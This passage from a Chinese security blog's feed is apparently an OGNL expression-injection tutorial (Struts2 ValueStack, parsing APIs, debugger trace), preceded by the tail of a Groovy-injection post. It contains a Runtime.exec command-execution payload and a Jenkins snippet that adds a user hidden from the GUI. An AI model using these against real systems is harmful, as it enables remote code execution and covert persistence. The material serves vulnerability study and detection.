class="line">instance.setSecurityRealm(hudsonRealm)</span><br><span class="line">instance.save()</span><br></pre></td></tr></table></figure><blockquote><p>我们发现通过这种方式添加用户，在图形化界面是看不到这个用户存在的，但是还是可以正常登陆Jenkins的console口。</p></blockquote><h2 id="0x04-排查方法"><a href="#0x04-排查方法" class="headerlink" title="0x04 排查方法"></a>0x04 排查方法</h2><p>排查关键类函数特征：</p><table><thead><tr><th>关键类</th><th>关键函数</th></tr></thead><tbody><tr><td>groovy.lang.GroovyShell</td><td>evaluate</td></tr><tr><td>groovy.util.GroovyScriptEngine</td><td>run</td></tr><tr><td>groovy.lang.GroovyClassLoader</td><td>parseClass</td></tr><tr><td>javax.script.ScriptEngine</td><td>eval</td></tr></tbody></table><p>除此之外，还需要关注几个模板的调用：</p><ul><li>SimpleTemplateEngine</li><li>StreamingTemplateEngine</li><li>GStringTemplateEngine</li><li>XmlTemplateEngine</li><li>MarkupTemplateEngine</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/6372" target="_blank" rel="noopener">Jenkins groovy scripts for read teamers and penetration testers</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Groovy注入" scheme="https://www.mi1k7ea.com/tags/Groovy%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>OGNL表达式注入漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/16/OGNL表达式注入漏洞总结/</id>
    <published>2020-03-16T13:51:15.000Z</published>
    <updated>2020-03-22T14:23:23.818Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-OGNL表达式基础"><a href="#0x01-OGNL表达式基础" class="headerlink" title="0x01 OGNL表达式基础"></a>0x01 OGNL表达式基础</h2><h3 id="OGNL简介"><a href="#OGNL简介" class="headerlink" title="OGNL简介"></a>OGNL简介</h3><p>OGNL全称Object-Graph Navigation Language即对象导航图语言，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。</p><p>OGNL使用<strong>Java反射</strong>和<strong>内省</strong>来解决运行时应用程序的对象图。这允许程序根据对象图的状态改变行为，而不是依赖于编译时设置。它还允许更改对象图。</p><p>简单了解下Java内省机制：</p><blockquote><p>Java语言内省（Introspector）是Java语言对Bean类属性、事件的一种缺省处理方法。例如类A中有属性name,那我们可以通过getName,setName来得到其值或者设置新的值。通过getName/setName来访问name属性，这就是默认的规则。Java中提供了一套API用来访问某个属性的getter/setter方法，通过这些API可以使你不需要了解这个规则（但你最好还是要搞清楚），这些API存放于包java.beans中。</p><p>一般的做法是通过类Introspector来获取某个对象的BeanInfo信息，然后通过BeanInfo来获取属性的描述器（PropertyDescriptor），通过这个属性描述器就可以获取某个属性对应的getter/setter方法，然后我们就可以通过反射机制来调用这些方法。</p></blockquote><p>OGNL可以让我们用非常简单的表达式访问对象层，例如，当前环境的根对象为user1，则表达式person.address[0].province可以访问到user1的person属性的第一个address的province属性。</p><p>webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。</p><p>OGNL表达式具有以下特点：</p><ul><li>支持对象方法调用，如<code>objName.methodName()</code>；</li><li>支持类静态方法调用和值访问，表达式的格式为<code>@[类全名（包括包路径）]@[方法名|值名]</code>，如@java.lang.String@format(‘fruit%s’,’frt’)；</li><li>支持赋值操作和表达式串联，如price=100、discount=0.8，calculatePrice(price*discount)这个表达式会返回80；</li><li>访问OGNL上下文（OGNL context）和ActionContext；</li><li>操作集合对象；</li><li>可以直接new一个对象；</li></ul><h3 id="OGNL三要素"><a href="#OGNL三要素" class="headerlink" title="OGNL三要素"></a>OGNL三要素</h3><p>OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。</p><ul><li>表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；</li><li>根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；</li><li>上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值；</li></ul><p>这样不难知道，OGNL的context是包含root的。</p><p>Struts2中的ActionContext即为OGNL的context（又称context map），其中包含的ValueStack即为OGNL的root。该ActionContext包含的对象如图：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/1.png" alt=""></p><h3 id="ActionContext"><a href="#ActionContext" class="headerlink" title="ActionContext"></a>ActionContext</h3><p>ActionContext是上下文对象，对应OGNL的context，是一个以MAP为结构、利用键值对关系来描述对象中的属性以及值的对象，简单来说可以理解为一个action的小型数据库，整个action生命周期（线程）中所使用的数据都在这个ActionContext中。</p><p>借网上的一个图看下ActionContext中包含哪些东西：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/2.png" alt=""></p><p>除了三个常见的作用域<code>request</code>、<code>session</code>、<code>application</code>外，还有以下三个作用域：</p><ul><li>attr：保存着上面三个作用域的所有属性，如果有重复的则以request域中的属性为基准；</li><li>paramters：保存的是表单提交的参数；</li><li>VALUE_STACK：值栈，保存着valueStack对象，也就是说可以通过ActionContext访问到valueStack中的值；</li></ul><h3 id="ValueStack"><a href="#ValueStack" class="headerlink" title="ValueStack"></a>ValueStack</h3><p>值栈（ValueStack）就是OGNL表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。</p><p>在使用Struts2的项目中，Struts2会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。</p><h4 id="值栈的作用"><a href="#值栈的作用" class="headerlink" title="值栈的作用"></a>值栈的作用</h4><p>值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将Struts2的标签与OGNL表达式结合使用。值栈实际上是一个接口，在Struts2中利用OGNL时，实际上使用的就是实现了该接口的OgnlValueStack类，这个类是OGNL的基础。</p><p>值栈贯穿整个Action的生命周期，每个Action类的对象实例都拥有一个ValueStack对象，在ValueStack对象中保存了当前Action对象和其他相关对象。</p><p>要获取值栈中存储的数据，首先应该获取值栈。值栈的获取有两种方式，具体如下。</p><h4 id="在request中获取值栈"><a href="#在request中获取值栈" class="headerlink" title="在request中获取值栈"></a>在request中获取值栈</h4><p>ValueStack对象在request范围内的存储方式为<code>request.setAttribute(&quot;struts.valueStack&quot;,valuestack)</code>，可以通过如下方式从request中取出值栈的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取 ValueStack 对象，通过 request 对象获取</span></span><br><span class="line">ValueStack valueStack = (ValueStack)ServletActionContext.getRequest()</span><br><span class="line">            .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY);</span><br></pre></td></tr></table></figure><p>在上述示例代码中，ServletActionContext.STRUTS_VALUESTACK_KEY是ServletActionContext类中的常量，它的值为struts.valueStack。</p><h4 id="在ActionContext中获取值栈"><a href="#在ActionContext中获取值栈" class="headerlink" title="在ActionContext中获取值栈"></a>在ActionContext中获取值栈</h4><p>在使用Struts2框架时，可以使用OGNL操作Context对象从ValueStack中存取数据，也就是说，可以从Context对象中获取ValueStack对象。实际上，Struts2框架中的Context对象就是ActionContext。</p><p>ActionContext获取ValueStack对象的方式如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过 ActionContext 获取 valueStack 对象</span></span><br><span class="line">ValueStack valueStack = ActionContext.getContext().getValueStack();</span><br></pre></td></tr></table></figure><p>ActionContext对象是在StrutsPrepareAndExcuteFilter的doFilter()方法中被创建的，在源码中用于创建ActionContext对象的createActionContext()方法内可以找到获取的ValueStack对象的信息。</p><p>方法中还有这样一段代码：  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx = <span class="keyword">new</span> ActionContext(stack.getContext());</span><br></pre></td></tr></table></figure><p>从上述代码中可以看出，ValueStack对象中的Context对象被作为参数传递给了ActionContext对象，这也就说明ActionContext对象中持有了ValueStack对象的引用，因此可以通过ActionContext对象获取ValueStack对象。</p><h3 id="OGNL基本语法"><a href="#OGNL基本语法" class="headerlink" title="OGNL基本语法"></a>OGNL基本语法</h3><p>OGNL支持各种纷繁复杂的表达式。但是最最基本的表达式的原型，是将对象的引用值用点串联起来，从左到右，每一次表达式计算返回的结果成为当前对象，后面部分接着在当前对象上进行计算，一直到全部表达式计算完成，返回最后得到的对象。OGNL则针对这条基本原则进行不断的扩充，从而使之支持对象树、数组、容器的访问，甚至是类似SQL中的投影选择等操作。</p><h4 id="基本对象树的访问"><a href="#基本对象树的访问" class="headerlink" title="基本对象树的访问"></a>基本对象树的访问</h4><p>对象树的访问就是通过使用点号将对象的引用串联起来进行。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxxx</span><br><span class="line">xxxx.xxxx</span><br><span class="line">xxxx.xxxx.xxxx.xxxx.xxxx</span><br></pre></td></tr></table></figure><h4 id="对容器变量的访问"><a href="#对容器变量的访问" class="headerlink" title="对容器变量的访问"></a>对容器变量的访问</h4><p>对容器变量的访问，通过#符号加上表达式进行。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#xxxx</span><br><span class="line">#xxxx.xxxx</span><br><span class="line">#xxxx.xxxxx.xxxx.xxxx.xxxx</span><br></pre></td></tr></table></figure><h4 id="使用操作符号"><a href="#使用操作符号" class="headerlink" title="使用操作符号"></a>使用操作符号</h4><p>OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用<code>+, -, *, /, ++, --, ==, !=, =</code>等操作符之外，还能使用<code>mod, in, not in</code>等。</p><h4 id="容器、数组、对象"><a href="#容器、数组、对象" class="headerlink" title="容器、数组、对象"></a>容器、数组、对象</h4><p>OGNL支持对数组和ArrayList等容器的顺序访问。例如：<code>group.users[0]</code></p><p>同时，OGNL支持对Map的按键值查找。例如：<code>#session[&#39;mySessionPropKey&#39;]</code></p><p>不仅如此，OGNL还支持容器的构造的表达式。例如：<code>{&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;}</code>构造一个List，<code>#{&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;}</code>构造一个Map</p><p>你也可以通过任意类对象的构造函数进行对象新建。例如：<code>new Java.net.URL(&quot;xxxxxx/&quot;)</code></p><h4 id="对静态方法或变量的访问"><a href="#对静态方法或变量的访问" class="headerlink" title="对静态方法或变量的访问"></a>对静态方法或变量的访问</h4><p>要引用类的静态方法和字段，他们的表达方式是一样的<code>@class@member</code>或者<code>@class@method(args)</code>。</p><p>例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources</p><h4 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h4><p>直接通过类似Java的方法调用方式进行，你甚至可以传递参数。</p><p>例如：<code>user.getName()</code>，<code>group.users.size()</code>，<code>group.containsUser(#requestUser)</code></p><h4 id="投影和选择"><a href="#投影和选择" class="headerlink" title="投影和选择"></a>投影和选择</h4><p>OGNL支持类似数据库中的投影（projection） 和选择（selection）。</p><p>投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 <code>collection.{XXX}</code>，其中XXX是这个集合中每个元素的公共属性。</p><p>例如：<code>group.userList.{username}</code>将获得某个group中的所有user的name的列表。</p><p>选择就是过滤满足selection条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：<code>collection.{X YYY}</code>，其中X是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：</p><ul><li><code>?</code>选择满足条件的所有元素</li><li><code>^</code>选择满足条件的第一个元素</li><li><code>$</code>选择满足条件的最后一个元素</li></ul><p>例如：<code>group.userList.{? #txxx.xxx != null}</code>将获得某个group中user的name不为空的user的列表。</p><h3 id="OGNL语法树"><a href="#OGNL语法树" class="headerlink" title="OGNL语法树"></a>OGNL语法树</h3><p>OGNL语法树有两种形式：</p><ul><li>(expression)(constant) = value</li><li>(constant)((expression1)(expression2))</li></ul><p>每个括号对应语法树上的一个分支，并且从最右边的叶子节点开始解析执行。</p><h3 id="关于”-”符号"><a href="#关于”-”符号" class="headerlink" title="关于”.”符号"></a>关于”.”符号</h3><p>所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name.toCharArray()[0].numbericValue.toString()</span><br></pre></td></tr></table></figure><ul><li>提取根(root)对象的name属性</li><li>调用上一步返回的结果字符串的toCharArray()方法</li><li>提取返回结果数组的第一个字符</li><li>获取字符的numbericValue属性，该字符是一个Character对象，Character类有个getNumeericValue()方法</li><li>调用结果Integer对象的toString()方法</li></ul><h3 id="和-和-的区别"><a href="#和-和-的区别" class="headerlink" title="# 和 % 和 $ 的区别"></a># 和 % 和 $ 的区别</h3><h4 id="符"><a href="#符" class="headerlink" title="#符"></a>#符</h4><p><code>#</code>符主要有三种用途：</p><ul><li>访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于<code>ActionContext.getContext()</code>；</li><li>用于过滤和投影（projecting）集合，如<code>books.{? #this.price&lt;100}</code>；</li><li>用于构造Map，如<code>#{&#39;foo1&#39;:&#39;bar1&#39;, &#39;foo2&#39;:&#39;bar2&#39;}</code>；</li></ul><h4 id="符-1"><a href="#符-1" class="headerlink" title="%符"></a>%符</h4><p><code>%</code>符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。</p><h4 id="符-2"><a href="#符-2" class="headerlink" title="$符"></a>$符</h4><p><code>$</code>符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。</p><h3 id="和-和-的区别-1"><a href="#和-和-的区别-1" class="headerlink" title="# 和 . 和 @ 的区别"></a># 和 . 和 @ 的区别</h3><ul><li>获取静态函数和变量的时候用@</li><li>获取非静态函数用.号获取</li><li>获取非静态变量用#获取</li></ul><h3 id="基本用法Demo"><a href="#基本用法Demo" class="headerlink" title="基本用法Demo"></a>基本用法Demo</h3><p>依赖的jar包：ognl-2.6.11.jar</p><p>示例代码1，基本的调用执行OGNL表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String str = <span class="string">"1+2"</span>;</span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">        Object ognl = Ognl.parseExpression(str);</span><br><span class="line">        Object value = Ognl.getValue(ognl,context,context.getRoot());</span><br><span class="line">        System.out.println(<span class="string">"result:"</span> + value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可输出<code>result:3</code>。</p><p>示例代码2，使用#符号从上下文获取变量值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">        context.put(<span class="string">"user"</span>,user);</span><br><span class="line">        String str = <span class="string">"#user.name"</span>;</span><br><span class="line">        Object ognl = Ognl.parseExpression(str);</span><br><span class="line">        Object value = Ognl.getValue(ognl,context,context.getRoot());</span><br><span class="line">        System.out.println(<span class="string">"result:"</span> + value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行输出<code>result:mi1k7ea</code>。</p><h3 id="OGNL与EL的区别"><a href="#OGNL与EL的区别" class="headerlink" title="OGNL与EL的区别"></a>OGNL与EL的区别</h3><p>因为OGNL表达式是Struts2的默认表达式语言，所以只针对Struts2标签有效；然而EL在HTML中也可以使用。</p><p>Struts2标签用的都是OGNL表达式语言，所以它多数都是去值栈的栈顶找值，找不到再去作用域；相反，EL都是去Map集合作用域中找。</p><p>页面取值区别如下表：</p><table><thead><tr><th>名称</th><th>servlet</th><th>OGNL</th><th>EL</th></tr></thead><tbody><tr><td>parameters</td><td>request.getParameter(“username”)</td><td>#username</td><td>${username}</td></tr><tr><td>request</td><td>request.getAttribute(“userName”)</td><td>#request.userName</td><td>${requestScope.username}</td></tr><tr><td>session</td><td>session.getAttribute(“userName”)</td><td>#session.userName</td><td>${sessionScope.username}</td></tr><tr><td>application</td><td>application.getAttribute(“userName”)</td><td>#application.userName</td><td>${applicationScope.username}</td></tr><tr><td>attr</td><td>用于按request &gt; session &gt; application顺序访问其属性（attribute）</td><td>#attr.userName相当于按顺序在以上三个范围（scope）内读取userName属性，直到找到为止</td></tr></tbody></table><h2 id="0x02-能解析OGNL的API"><a href="#0x02-能解析OGNL的API" class="headerlink" title="0x02 能解析OGNL的API"></a>0x02 能解析OGNL的API</h2><p>能解析OGNL的API如下表：</p><table><thead><tr><th style="text-align:left">类名</th><th style="text-align:left">方法名</th></tr></thead><tbody><tr><td style="text-align:left">com.opensymphony.xwork2.util.TextParseUtil</td><td style="text-align:left">translateVariables,translateVariablesCollection</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.TextParser</td><td style="text-align:left">evaluate</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.OgnlTextParser</td><td style="text-align:left">evaluate</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlUtil</td><td style="text-align:left">setProperties,setProperty,setValue,getValue,callMethod,compile</td></tr><tr><td style="text-align:left">org.apache.struts2.util.VelocityStrutsUtil</td><td style="text-align:left">evaluate</td></tr><tr><td style="text-align:left">org.apache.struts2.util.StrutsUtil</td><td style="text-align:left">isTrue,findString,findValue,getText,translateVariables,makeSelectList</td></tr><tr><td style="text-align:left">org.apache.struts2.views.jsp.ui.OgnlTool</td><td style="text-align:left">findValue</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.ValueStack</td><td style="text-align:left">findString,findValue,setValue,setParameter</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlValueStack</td><td style="text-align:left">findString,findValue,setValue,setParameter,trySetValue</td></tr><tr><td style="text-align:left">ognl.Ognl</td><td style="text-align:left">parseExpression,getValue,setValue</td></tr></tbody></table><p>以下是调用过程中可能会涉及到的一些类：</p><table><thead><tr><th style="text-align:left">涉及类名</th><th style="text-align:left">方法名</th></tr></thead><tbody><tr><td style="text-align:left">com.opensymphony.xwork2.ognl.OgnlReflectionProvider</td><td style="text-align:left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td></tr><tr><td style="text-align:left">com.opensymphony.xwork2.util.reflection.ReflectionProvider</td><td style="text-align:left">getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue</td></tr></tbody></table><h2 id="0x03-OGNL表达式注入漏洞"><a href="#0x03-OGNL表达式注入漏洞" class="headerlink" title="0x03 OGNL表达式注入漏洞"></a>0x03 OGNL表达式注入漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。</p><p>最简单的弹计算器的Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建一个OGNL上下文对象</span></span><br><span class="line">        OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// getValue()触发</span></span><br><span class="line">        <span class="comment">// @[类全名(包括包路径)]@[方法名|值名]</span></span><br><span class="line">        Ognl.getValue(<span class="string">"@java.lang.Runtime@getRuntime().exec('calc')"</span>, context, context.getRoot());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// setValue()触发</span></span><br><span class="line"><span class="comment">//        Ognl.setValue(Runtime.getRuntime().exec("calc"), context, context.getRoot());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getValue()和setValue()都能成功解析恶意的OGNL表达式、触发弹计算器：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/3.png" alt=""></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>这里简单调试分析下Ognl.getValue()解析OGNL表达式到执行命令的过程。</p><p>在前面的<code>Ognl.getValue</code>代码处打下断点，往下调试，看到调用了parseExpression()函数，该函数将传入的String类型的字符串解析为OGNL表达式能理解的ASTChain类型：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/5.png" alt=""></p><p>往下，将传入的ASTChain类型的tree参数转换成Node类型（ASTChain继承自SimpleNode、SimpleNode继承自Node）再调用其getValue()函数继续解析：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/6.png" alt=""></p><p>由于tree变量就是表达式解析来的东西，因此接下来的调用中局部环境中的this变量的值就是我们的OGNL表达式的内容。往下就是调用的SimpleNode.getValue()函数，其中调用了evaluateGetValueBody()函数：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/7.png" alt=""></p><p>evaluateGetValueBody()函数，顾名思义，用于计算getValue体中OGNL表达式的值。跟进看是直接调用了getValueBody()函数：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/8.png" alt=""></p><p>跟下去，就是调用的ASTChain.getValueBody()函数，这里会循环解析ASTChain中每个节点的表达式，这里有两个子节点，首先会解析第一个节点即<a href="mailto:`@java.lang.Runtime" target="_blank" rel="noopener">`@java.lang.Runtime</a>@getRuntime()`这个OGNL表达式：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/9.png" alt=""></p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/10.png" alt=""></p><p>跟进第一个子节点的解析过程，在ASTStaticMethod.getValueBody()函数中调用了OgnlRuntime.callStaticMethod()方法，其中已经将第一个子节点的表达式中的类和方法分别提取出来了：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/11.png" alt=""></p><p>跟进去，其中调用了classForName()函数来根据className参数寻找到java.lang.Runtime类，再往下解析：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/12.png" alt=""></p><p>往下，调用OgnlRuntime.getMethods()函数获取到java.lang.Runtime类的getRuntime()方法后，进一步调用OgnlRuntime.callAppropriateMethod()函数进行解析：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/13.png" alt=""></p><p>跟进OgnlRuntime.callAppropriateMethod()函数中，这里就是通过调用invokeMethod()函数来实现OGNL表达式中的类方法的调用：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/14.png" alt=""></p><p>跟进它的invokeMethod()函数，看到是Method.invoke()即通过反射机制实现java.lang.Runtime.getRuntime()方法的调用：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/15.png" alt=""></p><p>当然这里只是ASTChain的第一个子节点，该类方法执行完还没弹计算器，关键还要解析完ASTChain的第二个子节点、形成解析OGNL表达式节点链来实现完整的类方法调用。</p><p>接着调试，我们会返回到ASTChain.getValueBody()函数的for循环中继续循坏遍历解析第二个子节点，可以看到此时第二个子节点的OGNL表达式内容为<code>exec(&quot;calc&quot;)</code>：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/16.png" alt=""></p><p>后面的解析过程和解析第一个子节点的时候几乎是一样的。在调用OgnlRuntime.callMethod()函数时，参数source为前面解析第一个子节点表达式时得到的Runtime类，另外两个参数则为分辨出的方法名和参数值：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/17.png" alt=""></p><p>往下，解析得到具体的类方法exec()：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/18.png" alt=""></p><p>往下，就是反射调用Runtime.exec()函数实现任意类方法调用来谈计算器了：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/19.png" alt=""></p><p>此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">invokeMethod:518, OgnlRuntime (ognl)</span><br><span class="line">callAppropriateMethod:812, OgnlRuntime (ognl)</span><br><span class="line">callMethod:61, ObjectMethodAccessor (ognl)</span><br><span class="line">callMethod:846, OgnlRuntime (ognl)</span><br><span class="line">getValueBody:73, ASTMethod (ognl)</span><br><span class="line">evaluateGetValueBody:170, SimpleNode (ognl)</span><br><span class="line">getValue:210, SimpleNode (ognl)</span><br><span class="line">getValueBody:109, ASTChain (ognl)</span><br><span class="line">evaluateGetValueBody:170, SimpleNode (ognl)</span><br><span class="line">getValue:210, SimpleNode (ognl)</span><br><span class="line">getValue:333, Ognl (ognl)</span><br><span class="line">getValue:378, Ognl (ognl)</span><br><span class="line">getValue:357, Ognl (ognl)</span><br><span class="line">main:11, Test</span><br></pre></td></tr></table></figure><p>简单地说，OGNL表达式的getValue()解析过程就是先将整个OGNL表达式按照语法树分为几个子节点树，然后循环遍历解析各个子节点树上的OGNL表达式，其中通过Method.invoke()即反射的方式实现任意类方法调用，将各个节点解析获取到的类方法通过ASTChain链的方式串连起来实现完整的表达式解析、得到完整的类方法调用。</p><h3 id="HTTP请求中常见的注入点"><a href="#HTTP请求中常见的注入点" class="headerlink" title="HTTP请求中常见的注入点"></a>HTTP请求中常见的注入点</h3><p>HTTP请求中常见的注入点如下表（来自<a href="https://www.freebuf.com/vuls/168609.html" target="_blank" rel="noopener">Struts2著名RCE漏洞引发的十年之思</a>）：</p><p><img src="/2020/03/16/OGNL表达式注入漏洞总结/4.png" alt=""></p><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure 